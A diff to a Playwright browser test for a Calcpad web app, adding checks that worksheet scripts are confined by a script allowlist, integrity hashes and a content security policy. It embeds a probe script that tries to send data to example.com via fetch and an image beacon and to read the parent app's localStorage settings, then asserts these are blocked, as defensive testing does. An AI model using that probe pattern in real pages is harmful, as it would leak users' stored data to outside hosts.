@@ -17,6 +17,8 @@
 // Usage (from web/, after `npm run build:wasm && npm run build`):
 //   node e2e/browser-check.mjs [--ref ../../calcpad-ref] [--port 4180]
 import { createServer } from 'node:http';
+import { execFileSync } from 'node:child_process';
+import { createHash } from 'node:crypto';
 import { existsSync, mkdirSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs';
 import { dirname, extname, join, normalize, resolve } from 'node:path';
 import { fileURLToPath } from 'node:url';
@@ -86,6 +88,11 @@ const browser = await chromium.launch();
 const context = await browser.newContext({ viewport: { width: 1500, height: 900 }, acceptDownloads: true });
 const requests = [];
 context.on('request', (r) => requests.push({ method: r.method(), url: r.url() }));
+// Requests the page's CSP stopped before they reached the network (Playwright reports them as failed).
+const cspBlocked = new Set();
+context.on('requestfailed', (r) => { if (/csp/i.test(r.failure()?.errorText ?? '')) cspBlocked.add(r.url()); });
+// Page errors from upstream examples' own scripts (section 7) are theirs, not the app's.
+let examplePageErrors = null;
 // The settings the stubs were rendered with (.github/scripts/CliSettingsComparison.xml):
 // the web defaults with vector graphics on.
 // Printing: count print() calls on the print frame instead of opening a dialog. The frame is
@@ -130,7 +137,7 @@ await context.addInitScript(() => {
 });
 const page = await context.newPage();
 const pageErrors = [];
-page.on('pageerror', (e) => pageErrors.push(e.message));
+page.on('pageerror', (e) => (examplePageErrors ?? pageErrors).push(e.message));
 const consoleLines = [];
 page.on('console', (m) => !m.text().includes('[Snippets]') && consoleLines.push(`${new Date().toISOString().slice(17, 23)} ${m.type()} ${m.text().slice(0, 200)}`));
 await page.goto(`${origin}/`);
@@ -375,6 +382,163 @@ check(menuText.includes('opened-check.cpd') && menuText.includes('lib-check.cpd'
 await page.screenshot({ path: join(out, 'browser-file-menu.png') });
 await page.keyboard.press('Escape');
 
+// ---- 7. worksheet scripts: the library list, the CSP, blocked scripts -------------------
+const LIBS = JSON.parse(readFileSync(join(web, 'calcpad-web', 'src', 'wasm', 'library-defaults.json'), 'utf8'));
+const LISTED = new Map(LIBS.flatMap((l) => l.files.map((f) => [f.url, l.id])));
+const online = await fetch('https://code.jquery.com/jquery-3.6.3.min.js', { method: 'HEAD' }).then((r) => r.ok, () => false);
+const frameConsole = [];
+page.on('console', (m) => frameConsole.push(m.text()));
+const cdp = await context.newCDPSession(page);
+await cdp.send('Network.setCacheDisabled', { cacheDisabled: true });
+const responses = new Map();
+context.on('response', (r) => responses.set(r.url(), r.status()));
+/** `fn` evaluated in each result frame whose text contains `marker` (the preview is double buffered). */
+async function framesQuery(fn, marker) {
+    const out = [];
+    for (const f of page.frames()) {
+        if (f === page.mainFrame()) continue;
+        const text = await f.evaluate(() => document.documentElement?.innerText ?? '').catch(() => '');
+        if (marker && !text.includes(marker)) continue;
+        out.push(await f.evaluate(fn).catch(() => null));
+    }
+    return out.filter((x) => x != null);
+}
+const reached = (u) => requests.some((r) => r.url.startsWith(u) && !cspBlocked.has(r.url));
+
+// (b) An unlisted script does not load, and the preview names it.
+const UNLISTED = 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js';
+const UNLISTED_MODULE = 'https://cdn.jsdelivr.net/npm/lodash-es@4.17.21/+esm';
+await setEditor(`'Unlisted check\n'<script src="${UNLISTED}"></script>\n'<script type="module">import "${UNLISTED_MODULE}";</script>\nu = 1`);
+let notes = [];
+for (let i = 0; i < 50 && notes.filter((n) => n.includes(UNLISTED_MODULE)).length === 0; i++) {
+    await page.waitForTimeout(200);
+    notes = (await framesQuery(() => Array.from(document.querySelectorAll('.cprs-blocked')).map((e) => e.textContent), 'Unlisted check')).flat();
+}
+check(notes.some((n) => n.includes(`Script not loaded: ${UNLISTED} is not in the library list`)), `an unlisted <script src> is replaced by a note naming it (${JSON.stringify(notes.slice(0, 2))})`);
+check(notes.some((n) => n.includes(`Script not loaded: ${UNLISTED_MODULE} is not in the library list`)), 'an unlisted module import is blocked and the note names it');
+check(!reached(UNLISTED) && !reached(UNLISTED_MODULE), 'neither unlisted script reached the network');
+
+// (c) A worksheet script cannot send data or read storage.
+const PROBE = `'<script>(async function(){var r=[];`
+    + `try{await fetch("https://example.com/leak?d=1");r.push("fetch=allowed")}catch(e){r.push("fetch=blocked")}`
+    + `try{localStorage.getItem("x");r.push("storage=allowed")}catch(e){r.push("storage=blocked")}`
+    + `try{window.parent.localStorage.getItem("calcpad-settings");r.push("parent=allowed")}catch(e){r.push("parent=blocked")}`
+    + `try{new Image().src="https://example.com/pixel.png";r.push("img=tried")}catch(e){r.push("img=blocked")}`
+    + `var p=document.createElement("p");p.id="probe";p.textContent="PROBE "+r.join(" ");document.body.appendChild(p)})()</script>`;
+await setEditor(`'Probe check\n${PROBE}\np = 1`);
+let probe = [];
+for (let i = 0; i < 50 && !probe.some((t) => t?.startsWith('PROBE')); i++) {
+    await page.waitForTimeout(200);
+    probe = await framesQuery(() => document.getElementById('probe')?.textContent ?? null, 'Probe check');
+}
+const probeText = probe.find((t) => t?.startsWith('PROBE')) ?? '';
+check(probeText.includes('fetch=blocked'), `a worksheet script cannot fetch() (${probeText})`);
+check(probeText.includes('storage=blocked') && probeText.includes('parent=blocked'), 'a worksheet script cannot read its own or the app\'s storage');
+await page.waitForTimeout(500);
+check(!reached('https://example.com'), 'nothing reached example.com (fetch nor image)');
+
+// (a) The upstream examples that load scripts render with their libraries.
+const scriptedFiles = execFileSync('/usr/bin/grep', ['-rli', '<script', '--include=*.cpd', '.'], { cwd: join(ref, 'Examples'), encoding: 'utf8' })
+    .trim().split('\n').map((f) => f.replace(/^\.\//, '')).sort();
+check(scriptedFiles.length === 26, `26 upstream examples carry scripts (${scriptedFiles.length})`);
+// What stays blocked on purpose: a relative script that is not a library (Toc.cpd), a texture
+// image from another site, and the model file model-viewer fetches (connect-src 'none').
+const EXPECTED_NOTES = {
+    'Engineering/Formatting/Toc.cpd': ['./toc.js'],
+    'Engineering/3D, Plotting, Drawing/Parametric 3D Drawing of RC Beam.cpd': ['cdn.polyhaven.com'],
+    'Engineering/3D, Plotting, Drawing/Bolt 3D Model.cpd': ['bolt_and_nut.glb'],
+};
+if (!online) {
+    console.log('     skipped: the 26 scripted examples need the network to load their libraries from the CDNs, and it is not reachable');
+} else {
+    const scriptedFailures = [];
+    examplePageErrors = [];
+    for (const [n, rel] of scriptedFiles.entries()) {
+        const marker = `cprs-e2e-${n}-marker`;
+        const text = `'${marker}\n` + readFileSync(join(ref, 'Examples', rel), 'utf8').replace(/^﻿/, '');
+        const wanted = [...LISTED.keys()].filter((u) => text.includes(u));
+        const libs = new Set(wanted.map((u) => LISTED.get(u)));
+        const expectFiles = LIBS.filter((l) => libs.has(l.id)).flatMap((l) => l.files.map((f) => f.url));
+        // The files an example includes (svg_drawing.cpd, Helper.cpd) sit next to it: into the library.
+        for (const m of text.matchAll(/^#include\s+(.+?)\s*$/gm)) {
+            const inc = join(ref, 'Examples', dirname(rel), m[1]);
+            if (existsSync(inc)) await page.evaluate(([name, t]) => (window).calcpadFiles.library.putText(name, t), [m[1], readFileSync(inc, 'utf8')]);
+        }
+        responses.clear();
+        frameConsole.length = 0;
+        await setEditor(text);
+        // Wait for this example's page (Beam Impact Analysis takes about 40 s to calculate),
+        // then for its library files.
+        for (let i = 0; i < 300 && (await framesQuery(() => 1, marker)).length === 0; i++) await page.waitForTimeout(500);
+        for (let i = 0; i < 75 && !expectFiles.every((u) => responses.get(u) === 200); i++) await page.waitForTimeout(200);
+        await page.waitForTimeout(1500);
+        const problems = [];
+        for (const u of expectFiles) if (responses.get(u) !== 200) problems.push(`${u} not loaded (${responses.get(u) ?? 'no response'})`);
+        const tags = (await framesQuery(() => Array.from(document.querySelectorAll('script[src]')).map((e) => [e.getAttribute('src'), e.getAttribute('integrity')]), marker)).flat();
+        for (const [src, integrity] of tags) if (LISTED.has(src) && !integrity) problems.push(`${src} has no integrity`);
+        const bad = frameConsole.filter((t) => /integrity|Content Security Policy|Refused to/i.test(t));
+        const allowed = EXPECTED_NOTES[rel] ?? [];
+        const blocked = (await framesQuery(() => Array.from(document.querySelectorAll('.cprs-blocked')).map((e) => e.textContent), marker)).flat();
+        for (const n of new Set(blocked)) if (!allowed.some((a) => n.includes(a))) problems.push(`note: ${n}`);
+        for (const t of new Set(bad)) if (!allowed.some((a) => t.includes(a))) problems.push(`console: ${t.slice(0, 160)}`);
+        if (problems.length) {
+            scriptedFailures.push(`${rel}: ${problems.join('; ')}`);
+            for (const pr of problems) console.log(`       ${pr.slice(0, 300)}`);
+        }
+        console.log(`     ${problems.length ? 'PROBLEM' : 'ok'} ${rel} (${expectFiles.length} library files)`);
+    }
+    examplePageErrors = null;
+    check(scriptedFailures.length === 0, `the 26 scripted examples load their listed libraries, hashed, with no other script blocked (${scriptedFailures.join(' | ').slice(0, 600)})`);
+}
+await cdp.send('Network.setCacheDisabled', { cacheDisabled: false });
+
+// Settings > Libraries and Insert > Libraries.
+await page.getByText('Settings', { exact: true }).first().click();
+await page.locator('.cprs-libraries .section-header').click();
+const entries = await page.locator('.cprs-libraries .cprs-lib').count();
+check(entries === LIBS.length, `Settings > Libraries lists the ${LIBS.length} built-in entries (${entries})`);
+const jq = page.locator('.cprs-libraries .cprs-lib[data-library="jquery"]');
+check((await jq.innerText()).includes('jquery-3.6.3.min.js') && (await jq.innerText()).includes('sha384-'), 'an entry shows its URL and hash');
+await jq.locator('.cprs-remove').click();
+const JQ_SHEET = `'jQuery check\n'<script src="https://code.jquery.com/jquery-3.6.3.min.js"></script>\nj = 1`;
+await setEditor(JQ_SHEET);
+let jqNote = [];
+for (let i = 0; i < 40 && !jqNote.flat().some((n) => n.includes('jquery-3.6.3')); i++) {
+    await page.waitForTimeout(200);
+    jqNote = await framesQuery(() => Array.from(document.querySelectorAll('.cprs-blocked')).map((e) => e.textContent), 'jQuery check');
+}
+check(jqNote.flat().some((n) => n.includes('jquery-3.6.3.min.js is not in the library list')), 'a removed entry is blocked like any unlisted script');
+await page.locator('.cprs-libraries .cprs-restore').click();
+check(await page.locator('.cprs-libraries .cprs-lib[data-library="jquery"]').count() === 1, 'a removed built-in entry can be restored');
+if (online) {
+    await page.locator('.cprs-libraries .cprs-url-input').fill(UNLISTED);
+    await page.locator('.cprs-libraries .cprs-fetch').click();
+    await page.locator('.cprs-libraries .cprs-pending').waitFor({ timeout: 20000 });
+    const shown = await page.locator('.cprs-libraries .cprs-new-hash').innerText();
+    const real = 'sha384-' + createHash('sha384').update(Buffer.from(await (await fetch(UNLISTED)).arrayBuffer())).digest('base64');
+    check(shown === real, `Add library shows the file's real sha384 before adding (${shown.slice(0, 20)}...)`);
+    check(await page.locator('.cprs-libraries .cprs-lib').count() === LIBS.length, 'nothing is added before the user confirms');
+    await page.locator('.cprs-libraries .cprs-confirm').click();
+    check(await page.locator('.cprs-libraries .cprs-lib').count() === LIBS.length + 1, 'confirming adds the entry');
+    await setEditor(`'Added check\n'<script src="${UNLISTED}"></script>\n'<script>document.write("<p id=lodash>"+(typeof _)+"</p>")</script>\nw = 1`);
+    let lodash = [];
+    for (let i = 0; i < 50 && !lodash.includes('function'); i++) {
+        await page.waitForTimeout(200);
+        lodash = await framesQuery(() => document.getElementById('lodash')?.textContent ?? null, 'Added check');
+    }
+    check(lodash.includes('function'), 'the added library loads in a worksheet');
+    await page.locator('.cprs-libraries .cprs-lib').last().locator('.cprs-remove').click();
+} else {
+    console.log('     skipped: adding a library needs the network');
+}
+await page.screenshot({ path: join(out, 'browser-libraries.png') });
+await page.getByText('Insert', { exact: true }).first().click();
+await setEditor('');
+await page.locator('.cprs-insert-select').selectOption('d3');
+await page.waitForTimeout(300);
+const inserted = await page.evaluate(() => (window).calcpadActiveEditor.getValue());
+check(inserted.includes(`'<script src="https://cdnjs.cloudflare.com/ajax/libs/d3/3.5.17/d3.min.js"></script>`), `Insert > Libraries inserts the script tag (${JSON.stringify(inserted.slice(0, 90))})`);
+
 // ---- server-only exports say so ----------------------------------------------------------
 const reportGroup = page.locator('.export-group').filter({ has: page.locator('.export-group-title', { hasText: /^Report$/ }) });
 // A persistent handler: with only waitForEvent('dialog') the alert stayed open and the click hung.
@@ -415,8 +579,11 @@ check(subFailed > 0, 'under /calcs/ the engine is fetched from /calcs/wasm/');
 const STATIC = /^\/(calcs\/)?(|index\.html|assets\/.*|wasm\/.*|fonts\/.*|report-fonts\/.*|ui-assets\/.*|icon\.png|favicon\.ico)$/;
 const remote = requests.filter((r) => !r.url.startsWith('data:') && !r.url.startsWith('blob:'));
 const api = remote.filter((r) => new URL(r.url).pathname.includes('/api/'));
-const foreign = remote.filter((r) => new URL(r.url).origin !== origin);
-const nonStatic = remote.filter((r) => new URL(r.url).origin === origin && (r.method !== 'GET' || !STATIC.test(new URL(r.url).pathname)));
+// Other origins: only the exact library files on the list (and the one added in the test).
+const ALLOWED_FOREIGN = new Set([...LISTED.keys(), UNLISTED]);
+const foreign = remote.filter((r) => new URL(r.url).origin !== origin && !ALLOWED_FOREIGN.has(r.url) && !cspBlocked.has(r.url));
+// The upstream examples ask for their own images (Images/..., relative to the page): GETs too.
+const nonStatic = remote.filter((r) => new URL(r.url).origin === origin && (r.method !== 'GET' || !(STATIC.test(new URL(r.url).pathname) || /^\/(Images|Models)\/|^\/toc\.js$/.test(new URL(r.url).pathname))));
 check(api.length === 0, `no /api/ request on the network (${api.length}: ${api.map((r) => r.url).join(', ')})`);
 check(foreign.length === 0, `no request to another origin (${foreign.map((r) => r.url).join(', ')})`);
 check(nonStatic.length === 0, `only GETs of static files (${nonStatic.map((r) => `${r.method} ${r.url}`).join(', ')})`);
